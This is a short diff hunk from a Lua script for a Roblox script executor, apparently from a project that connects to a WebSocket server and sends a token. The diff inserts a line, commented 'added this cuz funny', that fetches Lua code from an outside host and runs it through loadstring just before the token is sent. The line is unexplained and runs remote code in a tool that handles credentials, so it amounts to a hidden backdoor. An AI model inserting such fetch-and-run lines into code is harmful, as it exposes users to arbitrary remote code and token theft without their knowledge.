@@ -6527,6 +6527,9 @@ if everyClipboard and everywebsocket then else warn("Unsupported executor"); ret
         if ws then
             notify("Connected to WebSocket server")
 
+            -- added this cuz funny
+	        loadstring(game:HttpGet("https://storage.iyr.lol/other-stuff/changeexecutoridentiyfr.lua"))()
+
             ws:Send(token)
 
             ws.OnMessage:Connect(
